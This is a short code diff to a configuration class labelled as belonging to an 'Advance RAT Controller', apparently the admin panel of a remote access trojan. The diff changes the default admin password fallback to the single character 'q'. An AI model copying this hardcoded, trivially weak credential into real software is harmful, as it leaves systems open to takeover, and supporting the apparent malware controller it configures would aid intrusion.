@@ -36,7 +36,7 @@ class Config:
     """Configuration class for Advance RAT Controller"""
     
     # Admin Authentication
-    ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'your_new_password_here')
+    ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'q')
     
     # Flask Configuration
     SECRET_KEY = os.environ.get('SECRET_KEY', None)
